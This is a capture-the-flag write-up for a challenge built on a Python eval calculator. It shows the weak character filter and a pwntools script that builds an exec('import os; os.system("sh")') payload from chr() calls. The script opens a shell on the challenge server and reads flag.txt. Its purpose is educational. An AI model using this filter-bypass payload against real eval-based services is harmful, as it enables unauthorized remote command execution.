# Math is Hard -- Solution

In this easy challenge, you get to interact with a simple calculator based on the Python's `eval` command. 


```python
def check_expression(s):
    """Allow only digits, decimal point, lowecase letters and math symbols."""
    SYMBOLS = ".+*-/()"
    for c in s:
        if not c.islower() and not c.isdigit() and c not in SYMBOLS:
            return False
    return True

def loop():
    """Main calculator loop."""
    vars = { c : 0 for c in ascii_lowercase }
    while True:
        line = input("$ ")
        if not line:
            print("Bye!")
            return
        items = line.split("=")
        if len(items) != 2:
            print("Invalid syntax!")
            continue
        varname, expression = items
        varname = varname.strip()
        expression = expression.strip()
        if len(varname) != 1 or not varname.islower():
            print("Invalid variable name!")
            continue
        if not check_expression(expression):
            print("Invalid character in expression!")
            continue
        result = eval(expression, vars, {'sin': sin, 'cos': cos, 'sqrt': sqrt, 'exp': exp, 'log': log, 'pi': pi})
        vars[varname] = result
        print(">>> {} = {}".format(varname, result))
```

There is some attempt to sandbox the calculator by restricting the syntax of expressions, but quick local experiment reveals that we can call the Python's built in `exec` function.

```
$ python3 calc.py 
PwnCalc -- a simple calculator
$ a=4
>>> a = 4
$ a = 4
>>> a = 4
$ b = 3
>>> b = 3
$ c = sqrt(a*a+b*b)
>>> c = 5.0
$ d = sin(pi/4)
>>> d = 0.7071067811865475
Have fun!

$ a = exec(0)
Traceback (most recent call last):
  File "calc.py", line 56, in <module>
    loop()
  File "calc.py", line 49, in loop
    result = eval(expression, vars, {'sin': sin, 'cos': cos, 'sqrt': sqrt, 'exp': exp, 'log': log, 'pi': pi})
  File "<string>", line 1, in <module>
TypeError: exec() arg 1 must be a string, bytes or code object
```

To succesfully exploit the calculator, we build a command string using the built in `chr` function and pass it to the `exec` command.

```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 19815)
    else:
        p = process(['python3', 'calc.py'])
    return p

def run_remotely(cmd):
    payload = '+'.join('chr({})'.format(x) for x in cmd)
    payload = 'a = exec({})'.format(payload)
    p = conn()
    p.recvuntil(b'Have fun!')
    p.sendlineafter(b'$ ', payload.encode())
    p.interactive()

print(run_remotely(b'import os; os.system("sh")'))
```

Now, we simply run the shell remotely and print out the flag.
```
$ python3 solve.py DEBUG REMOTE
[+] Opening connection to 0.cloud.chals.io on port 19815: Done
[DEBUG] Received 0xab bytes:
    b'PwnCalc -- a simple calculator\n'
    b'$ a=4\n'
    b'>>> a = 4\n'
    b'$ a = 4\n'
    b'>>> a = 4\n'
    b'$ b = 3\n'
    b'>>> b = 3\n'
    b'$ c = sqrt(a*a+b*b)\n'
    b'>>> c = 5.0\n'
    b'$ d = sin(pi/4)\n'
    b'>>> d = 0.7071067811865475\n'
    b'Have fun!\n'
    b'\n'
    b'$ '
[DEBUG] Sent 0xec bytes:
    b'a = exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(32)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(115)+chr(104)+chr(34)+chr(41))\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1a bytes:
    b'calc.py\n'
    b'flag.txt\n'
    b'serve.sh\n'
calc.py
flag.txt
serve.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x24 bytes:
    b'TBTL{4Nd_54nd80x1n6_15_3v3n_h4rd3r}\n'
TBTL{4Nd_54nd80x1n6_15_3v3n_h4rd3r}
```